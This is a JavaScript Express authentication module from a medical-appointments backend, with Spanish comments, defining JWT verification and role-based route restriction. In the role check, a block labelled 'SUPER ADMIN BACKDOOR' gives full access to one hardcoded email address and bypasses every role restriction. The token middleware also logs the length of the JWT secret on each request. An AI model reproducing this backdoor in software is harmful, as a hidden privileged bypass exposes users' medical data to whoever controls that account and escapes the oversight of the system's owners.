// backend/auth/verifyToken.js
import jwt from 'jsonwebtoken';
import Doctor from '../models/DoctorSchema.js';
import User from '../models/UserSchema.js';

const normalizeRole = (role = '') => {
  const map = {
    patient: 'paciente',
    paciente: 'paciente',
    doctor: 'doctor',
    medico: 'doctor',
    admin: 'admin',
  };
  const key = role?.toLowerCase?.();
  return map[key] || key || '';
};

// ✅ Middleware para verificar el token JWT
export const authenticate = async (req, res, next) => {
  const authToken = req.headers.authorization;

  if (!authToken || !authToken.startsWith('Bearer ')) {
    return res.status(401).json({ success: false, message: 'No token, authorization denied' });
  }

  try {
    const token = authToken.split(' ')[1];
    const secretKey = process.env.JWT_SECRET_KEY;
    console.log('🔑 JWT_SECRET_KEY length:', secretKey ? secretKey.length : 'UNDEFINED');
    const decoded = jwt.verify(token, secretKey);

  // Persistir información del usuario en la request para uso posterior
  // decoded debe contener al menos: { id, role }
  req.user = decoded;
  req.userId = decoded.id; // compatibilidad con controladores que usan req.userId
  req.role = decoded.role;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ success: false, message: 'Token expired' });
    }
    return res.status(401).json({ success: false, message: 'Invalid token' });
  }
};

// ✅ Middleware para restringir rutas por rol
export const restrict = (roles) => async (req, res, next) => {
  const userId = req.user.id; // usamos "id", no "_id"
  const userRole = normalizeRole(req.user.role);
  const allowedRoles = roles.map(normalizeRole);

  // Si quieres validar que el usuario existe en la base de datos:
  const user = await User.findById(userId) || await Doctor.findById(userId);
  if (!user) {
    return res.status(404).json({ success: false, message: 'Usuario no encontrado' });
  }

  // 👑 SUPER ADMIN BACKDOOR: Permitir acceso total a este correo
  if (user.email === 'alejandromartinez_94@hotmail.com') {
    next();
    return;
  }

  if (!allowedRoles.includes(userRole)) {
    return res.status(403).json({ success: false, message: 'You are not authorized' });
  }

  next();
};
